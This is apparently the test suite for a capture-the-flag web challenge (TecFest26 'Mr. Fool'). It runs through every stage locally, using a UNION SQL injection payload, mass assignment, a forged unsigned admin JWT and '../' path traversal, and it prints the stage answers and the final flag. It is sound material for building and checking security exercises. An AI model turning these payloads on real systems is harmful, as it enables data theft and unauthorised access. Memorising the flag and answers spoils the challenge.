#!/usr/bin/env python3
"""
test_verification.py: Automated test suite for Mr. Fool 5-sequence refactor.
"""

import os
import sys
import json
import base64
import unittest

# Ensure src is in python path
src_dir = os.path.join(os.path.dirname(__file__), 'src')
sys.path.insert(0, src_dir)

import utils
import models
import app


class TestMrFoolRefactor(unittest.TestCase):
    def setUp(self):
        app.app.config['TESTING'] = True
        app.app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///:memory:'
        with app.app.app_context():
            app.db.create_all()
            if not models.Joke.query.first():
                app.db.session.add_all([
                    models.Joke(content='Why did the Beyonder cross the road? To become someone else on the other side.', author='attendant'),
                    models.Joke(content='I told a joke about UNION SELECT but nobody joined in.', author='clown'),
                ])
            if not models.PotionSecret.query.first():
                app.db.session.add(models.PotionSecret(name='clown_potion', secret_code='laughing_error_s8'))
            app.db.session.commit()
        self.client = app.app.test_client()

    def test_01_utils_configuration(self):
        """Verify 5-sequence definitions, next map, and flag in utils.py."""
        self.assertEqual(len(utils.SEQUENCES), 5)
        seq_ids = [s[0] for s in utils.SEQUENCES]
        self.assertEqual(seq_ids, ['S9', 'S8', 'S7', 'S6', 'S3'])

        expected_next = {
            'S9': 'S8',
            'S8': 'S7',
            'S7': 'S6',
            'S6': 'S3',
            'S3': 'S0'
        }
        self.assertEqual(utils.SEQUENCE_NEXT, expected_next)
        self.assertEqual(len(utils.SEQUENCE_URLS), 5)
        self.assertIn('S0', utils.ACTING_PRINCIPLES)
        self.assertEqual(len(utils.ACTING_PRINCIPLES), 6)

        # Progression check
        self.assertEqual(utils.get_current_sequence([]), 'S9')
        self.assertEqual(utils.get_current_sequence(['S9']), 'S8')
        self.assertEqual(utils.get_current_sequence(['S9', 'S8', 'S7', 'S6', 'S3']), 'S0')

        # Flag format check
        self.assertIn('TecFest26{h34rtb34t_h34rtbr34k_4ll_0v3r_g4l4u_p4r4h_b4ng3t}', utils.FLAG)

    def test_02_models_pruning(self):
        """Verify ShopItem model removed and retained models intact."""
        self.assertFalse(hasattr(models, 'ShopItem'))
        self.assertTrue(hasattr(models, 'Player'))
        self.assertTrue(hasattr(models, 'PotionToken'))
        self.assertTrue(hasattr(models, 'Spell'))
        self.assertTrue(hasattr(models, 'Joke'))
        self.assertTrue(hasattr(models, 'PotionSecret'))

    def test_03_deleted_routes_return_404(self):
        """Verify deleted sequences S5, S4, S2, S1 endpoints return 404."""
        deleted_endpoints = [
            '/s5/marionettist',
            '/s5/marionettist/fetch',
            '/s4/sorcerer',
            '/s4/sorcerer/graphql',
            '/s2/miracle',
            '/s2/miracle/init',
            '/s2/miracle/api/shop',
            '/s2/miracle/api/buy',
            '/s1/attendant',
            '/s1/attendant/notice',
            '/s1/attendant/oracle',
            '/s1/attendant/verify_mac',
            '/s1/attendant/get_flag',
        ]
        for ep in deleted_endpoints:
            r = self.client.get(ep)
            self.assertEqual(r.status_code, 404, f"Endpoint {ep} should return 404, got {r.status_code}")

    def test_04_full_progression_exploit(self):
        """Test complete 5-sequence progression S9 -> S8 -> S7 -> S6 -> S3 -> S0."""
        # 1. S9 Seer
        r = self.client.get('/s9/seer')
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.headers.get('X-Hint'), 'Seek the prophecy parameter.')

        r = self.client.get('/s9/seer/robots.txt')
        self.assertIn('/s9/seer/hidden', r.data.decode())

        r = self.client.get('/s9/seer/hidden')
        self.assertIn('seer_sees_all', r.data.decode())

        r = self.client.post('/complete/S9', json={'answer': 'seer_sees_all'})
        d = r.get_json()
        self.assertTrue(d.get('success'))
        self.assertEqual(d.get('redirect'), '/s8/clown')

        # 2. S8 Clown
        r = self.client.get('/s8/clown/schema')
        self.assertEqual(r.status_code, 200)
        d = r.get_json()
        self.assertIn('potion_secrets', d.get('tables', []))

        # Test error softening
        r = self.client.post('/s8/clown/joke', json={'joke': "'"})
        d = r.get_json()
        self.assertFalse(d.get('success'))
        self.assertIn('schema', d)
        self.assertEqual(d['schema']['target_table'], 'potion_secrets')

        # Exploitation via UNION SQLi
        payload = "x' UNION SELECT id, secret_code, name FROM potion_secrets--"
        r = self.client.post('/s8/clown/joke', json={'joke': payload})
        self.assertEqual(r.status_code, 200)
        d = r.get_json()
        self.assertIn('laughing_error_s8', d.get('response', ''))

        r = self.client.post('/complete/S8', json={'answer': 'laughing_error_s8'})
        d = r.get_json()
        self.assertTrue(d.get('success'))
        self.assertEqual(d.get('redirect'), '/s7/magician')

        # 3. S7 Magician
        # Test rejection message softening
        r = self.client.post('/s7/magician/api/spells/create', json={'name': 'Spark', 'type': 'cantrip'})
        d = r.get_json()
        self.assertIn('"approved": true', d.get('message', ''))

        # Exploitation via Mass Assignment
        r = self.client.post(
            '/s7/magician/api/spells/create',
            json={'name': 'Fireball', 'type': 'evocation', 'approved': True}
        )
        d = r.get_json()
        self.assertIn('unauthorized_spell', d.get('message', ''))

        r = self.client.post('/complete/S7', json={'answer': 'unauthorized_spell'})
        d = r.get_json()
        self.assertTrue(d.get('success'))
        self.assertEqual(d.get('redirect'), '/s6/faceless')

        # 4. S6 Faceless
        # Test rejection message softening
        r = self.client.get('/s6/faceless/admin', headers={'Authorization': 'Bearer bad.token'})
        # Expect helpful rejection
        d = r.get_json()
        self.assertFalse(d.get('success'))

        # Exploitation via JWT Forgery
        def b64url(val):
            return base64.urlsafe_b64encode(val.encode()).decode().rstrip('=')

        token_body = json.dumps({'username': 'admin', 'role': 'admin'})
        forged_jwt = f"{b64url(token_body)}.{b64url('fakesig')}"

        r = self.client.get('/s6/faceless/admin', headers={'Authorization': f"Bearer {forged_jwt}"})
        d = r.get_json()
        self.assertTrue(d.get('success'))
        self.assertIn('forged_identity', d.get('secret', ''))

        # Sequence 6 now bridges directly to Sequence 3!
        r = self.client.post('/complete/S6', json={'answer': 'forged_identity'})
        d = r.get_json()
        self.assertTrue(d.get('success'))
        self.assertEqual(d.get('redirect'), '/s3/scholar')

        # 5. S3 Scholar of Yore
        # Exploitation via direct path traversal '../secrets/lfi_token.txt'
        r = self.client.get('/s3/scholar/view', query_string={'scroll': '../secrets/lfi_token.txt'})
        d = r.get_json()
        self.assertIn('scholar_reading_deep', d.get('content', ''))

        # Sequence 3 now completes the 5-sequence trial and redirects to S0!
        r = self.client.post('/complete/S3', json={'answer': 'scholar_reading_deep'})
        d = r.get_json()
        self.assertTrue(d.get('success'))
        self.assertEqual(d.get('redirect'), '/s0/fool')

        # 6. S0 The Fool (Finale)
        r = self.client.get('/s0/fool')
        self.assertEqual(r.status_code, 200)
        html = r.data.decode()
        self.assertIn('TecFest26{h34rtb34t_h34rtbr34k_4ll_0v3r_g4l4u_p4r4h_b4ng3t}', html)
        self.assertIn('all five potions', html)
        self.assertIn('Copy Flag', html)


if __name__ == '__main__':
    unittest.main()
